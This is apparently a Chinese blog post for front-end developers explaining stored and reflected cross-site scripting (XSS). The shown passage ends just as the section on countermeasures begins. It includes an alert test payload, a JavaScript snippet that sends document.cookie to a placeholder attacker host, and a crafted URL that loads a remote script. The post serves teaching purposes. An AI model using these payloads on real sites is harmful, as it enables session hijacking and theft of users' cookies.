---
title: 前端安全
date: 2020-11-27 20:21:54
tags:
  - 安全
categories: 
  - 安全
cover: https://s3.ax1x.com/2020/11/20/DQwbfs.md.jpg
abbrlink: 202029
---

# 前言
今天来聊一聊关于前端安全方面的问题，身为前端开发也是要对安全方面有一定的了解的。在安全方面这些属于常识。

# XSS
全名为（Cross Site Scripting）跨站脚本攻击，缩写原本应为CSS，但和那个CSS重名了，所以就改叫` XSS `。跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的非本站点HTML标签或JS进行的一种攻击。
跨站脚本攻击的影响：
+ 利用虚假输入表单骗取用户个人信息
+ 利用恶意脚本窃取用户Cookie，被害者在不知情情况下帮助攻击者发送恶意请求

XSS 攻击主要分为两种：**存储型**和**反射型**

## 存储型
存储型XSS攻击大致需要经过如下步骤：
1. 黑客将JS脚本提交到网站的数据库中
2. 用户请求网站请求到了黑客设置的恶意JS脚本
3. 用户使用被**存储**恶意脚本的网站，脚本会将用户相关信息发到黑客的服务器

我们现在来充当一次黑客，来看一下攻击的流程。比如在一些需要提交信息到服务器的网站的输入框中输入一个JS脚本代码。

<input value="<script>alert(1)</script>"/>

然后我们提交这个内容给服务器，那么我们就在这个网站的数据库中添加了这一段js脚本，那么会发生什么事呢？接下来访问这个网站的用户都会显示这个alert信息。那我们要是做得在过火一些呢？

这次我们在输入框中输入一段我们写好的js脚本，这里假如这段脚本会窃取用户的cookie信息。
```js hack.js
let img = new Image();
img.src="http://eyijiaoben/xxxxx"+document.cookie
```
你应该可以猜到了接下来会发生什么了，我们向数据库注入这段脚本后，登录到这个页面的用户都会运行这个脚本，向我们指定的这个地址发送请求，并且携带自己的cookie给黑客，这样黑客就窃取到了用户的cookie。黑客拿到这个cookie之后就会做一些非法操作，后果可想而知。

这就是存储型攻击，原理其实很简单，就是在服务端的数据库中植入一个自己的恶意脚本来完成的。

## 反射型
反射型攻击的通常场景是黑客把自己写好的恶意网站发送给受害者，受害者进入这个网站之后就收到了攻击。

与上次的输入框植入脚本不同，这次我们的植入方式是使用**URL参数注入的方式**，很多网站上一些页面的显示都是在url中传递的参数，这时我们可以伪装一个网站` http://xxx.xx/param=<script src="http://eyijiaoben/xxxxx"></script>? `。
受害者打开我们这个网站之后，并不会在页面显示param，而是去发送网络请求到这个恶意脚本的网址，然后发生的事情就和上面一样了，黑客就窃取到了用户的cookie。

但好在反射型攻击并不会将恶意脚本存储在服务器中，所以危害相较于存储型攻击是比较小的。

## 对抗手段
讲完了如何实现一次XSS攻击后，我们来说一下怎么预防XSS攻击